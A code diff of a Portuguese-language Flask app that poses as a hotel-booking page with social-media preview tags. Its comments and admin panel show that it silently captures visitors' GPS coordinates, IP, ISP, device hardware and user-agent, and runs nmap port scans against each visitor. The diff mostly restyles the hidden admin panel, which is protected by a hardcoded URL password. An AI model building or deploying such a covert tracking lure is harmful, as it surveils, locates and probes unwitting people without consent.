@@ -5,11 +5,10 @@ import json
 import nmap
 import threading
 from user_agents import parse
-import base64
 
 app = Flask(__name__)
 
-# Buffers de armazenamento em RAM (Mainframe Core)
+# Buffers de armazenamento em RAM
 registros_gps = []
 registros_ip = []
 
@@ -19,23 +18,15 @@ SENHA_ADMIN = "123123"
 # Link de redirecionamento final solicitado
 LINK_DESTINO = "https://www.google.com/maps/place/Oaks+Chengdu+at+Cultural+Heritage+Park/@30.6887276,103.9289403,15z/data=!4m12!1m2!2m1!1zSG90w6lpcw!3m8!1s0x36efc2ba0825d43b:0x2c1214b7071a826c!5m2!4m1!1i2!8m2!3d30.678253!4d103.93095!16s%2Fg%2F11sk9qfcrj?entry=ttu&g_ep=EgoyMDI2MDgzMS4wIKXMDSoASAFQAw%3D%3D"
 
-# Codificar a imagem trol.jpeg em Base64 automaticamente na inicialização
-try:
-    with open("trol.jpeg", "rb") as img_file:
-        trol_base64 = base64.b64encode(img_file.read()).decode('utf-8')
-        TROL_IMG_SRC = f"data:image/jpeg;base64,{trol_base64}"
-except Exception:
-    TROL_IMG_SRC = ""
-
-# Página HTML de Captura Totalmente Oculta (Silenciosa) com Meta Tags Open Graph
+# Página HTML de Captura Silenciosa com Meta Tags Open Graph
 HTML_CAPTURA = f"""
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hotéis na China e Região</title>
     
-    <!-- Meta Tags Open Graph para o WhatsApp / Redes Sociais -->
     <meta property="og:title" content="Reserva de Hotéis - Arquitetura e Hospedagem na China">
     <meta property="og:description" content="Encontre as melhores ofertas e pacotes de hospedagem na China com desconto exclusivo.">
     <meta property="og:image" content="https://images.unsplash.com/photo-1508804185872-d7badad00f7d">
@@ -120,184 +111,183 @@ HTML_CAPTURA = f"""
 </html>
 """
 
-# Painel Administrativo com imagem de alta visibilidade e frase personalizada abaixo
+# Painel Administrativo Otimizado para Celular (Fontes grandes, ID numérico, Lista zebrada)
 HTML_PAINEL = """
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>MAINFRAME TERMINAL - COBOL COMPILER</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Painel Mobile - Telemetria</title>
     <style>
         body { 
-            font-family: 'Courier New', Courier, monospace; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             margin: 0; 
-            padding: 20px; 
-            background: #000000; 
-            color: #00FF00; 
-            position: relative;
+            padding: 10px; 
+            background: #121212; 
+            color: #E0E0E0; 
         }
-        /* Contêiner fixo no canto superior direito para a imagem e a frase */
-        .troll-container {
-            position: fixed;
-            top: 15px;
-            right: 15px;
-            z-index: 100;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            pointer-events: none;
+        h2 {
+            color: #00FF66;
+            font-size: 18px;
+            border-bottom: 2px solid #00FF66;
+            padding-bottom: 5px;
+            margin-top: 20px;
         }
-        /* Imagem grande, sem transparência */
-        .troll-bg {
-            width: 420px;
-            height: 180px;
-            object-fit: fill;
-            opacity: 1;
-            border: 2px solid #00FF00;
-        }
-        /* Frase solicitada em amarelo logo abaixo */
-        .troll-text {
-            color: #FFFF00;
+        .status-box {
+            background: #1E1E1E;
+            padding: 10px;
+            border-radius: 6px;
             font-size: 14px;
-            font-weight: bold;
-            margin-top: 4px;
-            background: #000000;
-            padding: 2px 6px;
-            border: 1px solid #FFFF00;
+            margin-bottom: 15px;
+            border-left: 4px solid #00FF66;
         }
-        pre {
-            color: #00FF00;
-            font-size: 12px;
-            line-height: 1.4;
+        .table-container {
+            width: 100%;
+            overflow-x: auto;
+            margin-bottom: 25px;
         }
-        .yellow { color: #FFFF00; }
-        .red { color: #FF5555; }
-        .cyan { color: #55FFFF; }
-        .white { color: #FFFFFF; }
         table { 
             width: 100%; 
             border-collapse: collapse; 
-            background: #000000; 
-            margin-top: 15px; 
-            margin-bottom: 30px;
-            border: 1px solid #00FF00;
+            background: #1E1E1E; 
+            font-size: 13px;
         }
         th, td { 
-            border: 1px solid #00FF00; 
-            padding: 6px 8px; 
+            border: 1px solid #333333; 
+            padding: 10px 8px; 
             text-align: left; 
-            font-size: 11px;
-            color: #FFFF00;
         }
         th { 
-            background: #001100; 
-            color: #00FF00; 
+            background: #252525; 
+            color: #00FF66; 
+            font-size: 13px;
         }
-        tr:hover { background: #002200; }
-        a { color: #55FFFF; text-decoration: none; }
+        /* Lista Zebrada */
+        tr:nth-child(even) { background: #181818; }
+        tr:nth-child(odd) { background: #212121; }
+        
+        a { color: #3399FF; text-decoration: none; font-weight: bold; }
         a:hover { text-decoration: underline; }
-        .badge { background: #003300; color: #00FF00; padding: 1px 4px; border: 1px solid #00FF00; font-size: 10px; display: inline-block; margin: 1px; }
+        .badge { 
+            background: #2D2D2D; 
+            color: #00FF66; 
+            padding: 3px 6px; 
+            border-radius: 4px; 
+            font-size: 11px; 
+            display: inline-block; 
+            margin: 2px 0;
+            border: 1px solid #444;
+        }
+        .id-tag {
+            background: #00FF66;
+            color: #000;
+            font-weight: bold;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 12px;
+            text-align: center;
+        }
+        details summary {
+            cursor: pointer;
+            color: #3399FF;
+            font-weight: bold;
+        }
+        .empty-msg {
+            color: #FF5555;
+            text-align: center;
+            padding: 15px;
+            font-size: 14px;
+        }
     </style>
 </head>
 <body>
 
-<!-- Bloco superior direito: Imagem aumentada + Frase em amarelo -->
-<div class="troll-container">
-    <img src="{{ troll_img }}" class="troll-bg" alt="Troll Face">
-    <div class="troll-text">BOLZONAROO🐵</div>
+<div class="status-box">
+    <b>CONSOLE MOBILE</b><br>
+    Status: <span style="color: #00FF66;">ONLINE</span> | Auto-Refresh: 5s
 </div>
 
-<pre>
-<span class="red">*--------------------------------------------------------------------------------------------------*</span>
-<span class="yellow">  identification division.</span>
-<span class="red">*--------------------------------------------------------------------------------------------------*</span>
-  program-id.      MAINFRAME-SECURE-CONSOLE.
-  author.          PENTESTER-CORE.
-  installation.    SYSTEM-TELEMETRY-UNIT.
-  date-written.    2026-09-03.
-<span class="red">*--------------------------------------------------------------------------------------------------*</span>
-  <span class="cyan">REFERENCIAS</span> :  SISTEMA   : U   - SUPORTE
-                 SUBSISTEMA: UP  - APOIO A PRODUCAO
-                 MODULO    : 06  - SCHEDULER & NMAP ENGINE
-<span class="red">*--------------------------------------------------------------------------------------------------*</span>
-  STATUS CONSOLE : <span class="white">ONLINE-ACTIVE</span> | AUTO-REFRESH: <span class="white">5s</span> | SECURE PROTOCOL: <span class="white">TCP/IP</span>
-</pre>
+<h2>[ 01 ] CAPTURAS DE GEOLOCALIZAÇÃO GPS ({{ gps|length }})</h2>
+<div class="table-container">
+    <table>
+        <tr>
+            <th>ID</th>
+            <th>DATA / HORA</th>
+            <th>IP ORIGEM</th>
+            <th>LAT / LONG</th>
+            <th>PRECISÃO</th>
+            <th>MAPS</th>
+        </tr>
+        {% for r in gps %}
+        <tr>
+            <td><span class="id-tag">#{{ loop.revindex }}</span></td>
+            <td>{{ r.data }}</td>
+            <td><b>{{ r.ip }}</b></td>
+            <td>{{ r.lat }}, {{ r.lon }}</td>
+            <td>{{ r.precisao }}m</td>
+            <td><a href="{{ r.maps }}" target="_blank">🗺️ Abrir</a></td>
+        </tr>
+        {% else %}
+        <tr><td colspan="6" class="empty-msg">Nenhum dado de GPS capturado ainda.</td></tr>
+        {% endfor %}
+    </table>
+</div>
 
-<h3 class="yellow">[ 01. TABELA DE CAPTURAS DE GEOLOCALIZAÇÃO GPS ]</h3>
-<p class="white">Total de Registros GPS Capturados: {{ gps|length }}</p>
-<table>
-    <tr>
-        <th>DATA / HORA</th>
-        <th>IP DE ORIGEM</th>
-        <th>LATITUDE / LONGITUDE</th>
-        <th>PRECISÃO</th>
-        <th>EXTERNAL MAP LINK</th>
-    </tr>
-    {% for r in gps %}
-    <tr>
-        <td>{{ r.data }}</td>
-        <td>{{ r.ip }}</td>
-        <td>{{ r.lat }}, {{ r.lon }}</td>
-        <td>{{ r.precisao }}m</td>
-        <td><a href="{{ r.maps }}" target="_blank">[ABRIR GOOGLE MAPS]</a></td>
-    </tr>
-    {% else %}
-    <tr><td colspan="5" style="color: #FF5555; text-align: center;">>> 01 CONDITIONAL: NENHUM DADO DE GPS CAPTURADO NESTE CLUSTER <<</td></tr>
-    {% endfor %}
-</table>
-
-<h3 class="yellow">[ 02. TABELA DE INTELIGÊNCIA DE REDE, HARDWARE, NMAP & USER-AGENT ]</h3>
-<p class="white">Total de Registros de Hardware/Rede: {{ ips|length }}</p>
-<table>
-    <tr>
-        <th>DATA / HORA</th>
-        <th>IP / GEO / REDE</th>
-        <th>ISP / PROVEDOR</th>
-        <th>HARDWARE & DISPOSITIVO</th>
-        <th>AMBIENTE & NAVEGADOR (USER-AGENT)</th>
-        <th>PORTAS ABERTAS (NMAP LAB SCAN)</th>
-    </tr>
-    {% for r in ips %}
-    <tr>
-        <td>{{ r.data }}</td>
-        <td>
-            {{ r.ip }}<br>
-            <span class="cyan">{{ r.cidade }}/{{ r.estado }} ({{ r.pais }})</span><br>
-            Link: <span class="white">{{ r.hw.connectionType }}</span>
-        </td>
-        <td>{{ r.isp }}</td>
-        <td>
-            CPU Cores: {{ r.hw.hardwareConcurrency }}<br>
-            RAM Aprox: {{ r.hw.deviceMemory }} GB<br>
-            Bateria: {{ r.hw.bateria }}<br>
-            Resolução: {{ r.hw.resolucqao }} ({{ r.hw.colorDepth }})<br>
-            Touch: {{ r.hw.maxTouchPoints }} | Cookies: {{ r.hw.cookieEnabled }}<br>
-            Fuso: {{ r.hw.timezone }}
-        </td>
-        <td>
-            <b>OS:</b> {{ r.ua_info.os }}<br>
-            <b>Browser:</b> {{ r.ua_info.browser }}<br>
-            <b>Device:</b> {{ r.ua_info.device }}<br>
-            <b>Idioma:</b> {{ r.hw.language }}<br>
-            <details style="margin-top: 4px;">
-                <summary style="cursor: pointer; color: #55FFFF;">Inspect User-Agent</summary>
-                <small style="word-break: break-all; color: #AAAAAA;">{{ r.user_agent }}</small>
-            </details>
-        </td>
-        <td>
-            {% if r.portas %}
-                {% for p in r.portas %}
-                    <span class="badge">Porta {{ p.porta }}: {{ p.servico }} ({{ p.estado }})</span><br>
-                {% endfor %}
-            {% else %}
-                <span class="red">PERFORM NMAP-SCAN VARYING...</span>
-            {% endif %}
-        </td>
-    </tr>
-    {% else %}
-    <tr><td colspan="6" style="color: #FF5555; text-align: center;">>> 01 CONDITIONAL: NENHUM REGISTRO DE HARDWARE CAPTURADO <<</td></tr>
-    {% endfor %}
-</table>
+<h2>[ 02 ] INTELIGÊNCIA DE REDE, HARDWARE & NMAP ({{ ips|length }})</h2>
+<div class="table-container">
+    <table>
+        <tr>
+            <th>ID</th>
+            <th>DATA / HORA</th>
+            <th>IP / LOCALIZAÇÃO / ISP</th>
+            <th>HARDWARE & DISPOSITIVO</th>
+            <th>NAVEGADOR / USER-AGENT</th>
+            <th>PORTAS ABERTAS</th>
+        </tr>
+        {% for r in ips %}
+        <tr>
+            <td><span class="id-tag">#{{ loop.revindex }}</span></td>
+            <td>{{ r.data }}</td>
+            <td>
+                <b>{{ r.ip }}</b><br>
+                <span style="color: #3399FF;">{{ r.cidade }}/{{ r.estado }}</span><br>
+                <small>{{ r.isp }}</small><br>
+                Conexão: <b>{{ r.hw.connectionType }}</b>
+            </td>
+            <td>
+                Cores CPU: {{ r.hw.hardwareConcurrency }}<br>
+                RAM: {{ r.hw.deviceMemory }} GB<br>
+                Bateria: {{ r.hw.bateria }}<br>
+                Tela: {{ r.hw.resolucqao }}<br>
+                Touch: {{ r.hw.maxTouchPoints }} | Cookies: {{ r.hw.cookieEnabled }}<br>
+                Fuso: {{ r.hw.timezone }}
+            </td>
+            <td>
+                <b>OS:</b> {{ r.ua_info.os }}<br>
+                <b>Browser:</b> {{ r.ua_info.browser }}<br>
+                <b>Device:</b> {{ r.ua_info.device }}<br>
+                <b>Idioma:</b> {{ r.hw.language }}<br>
+                <details style="margin-top: 6px;">
+                    <summary>Ver User-Agent</summary>
+                    <small style="word-break: break-all; color: #AAAAAA;">{{ r.user_agent }}</small>
+                </details>
+            </td>
+            <td>
+                {% if r.portas %}
+                    {% for p in r.portas %}
+                        <span class="badge">P.{{ p.porta }}: {{ p.servico }} ({{ p.estado }})</span><br>
+                    {% endfor %}
+                {% else %}
+                    <span style="color: #FF5555;">Escaneando...</span>
+                {% endif %}
+            </td>
+        </tr>
+        {% else %}
+        <tr><td colspan="6" class="empty-msg">Nenhum registro de rede capturado ainda.</td></tr>
+        {% endfor %}
+    </table>
+</div>
 
 <script>
     setTimeout(function(){
@@ -405,13 +395,13 @@ def admin():
     senha_informada = request.args.get('senha', '')
     if senha_informada != SENHA_ADMIN:
         return """
-        <body style="font-family: 'Courier New'; background: #000000; color: #FF5555; text-align: center; margin-top: 15%;">
-            <h2>004010 SECURITY EXCEPTION - ACCESS DENIED</h2>
-            <p>AUTORIZAÇÃO REQUERIDA NA URL: <code>/admin?senha=SUA_SENHA</code></p>
+        <body style="font-family: sans-serif; background: #121212; color: #FF5555; text-align: center; margin-top: 20%;">
+            <h2>ACESSO NEGADO</h2>
+            <p>Informe a senha correta na URL: <code>/admin?senha=SUA_SENHA</code></p>
         </body>
         """, 403
         
-    return render_template_string(HTML_PAINEL, gps=registros_gps, ips=registros_ip, troll_img=TROL_IMG_SRC)
+    return render_template_string(HTML_PAINEL, gps=registros_gps, ips=registros_ip)
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
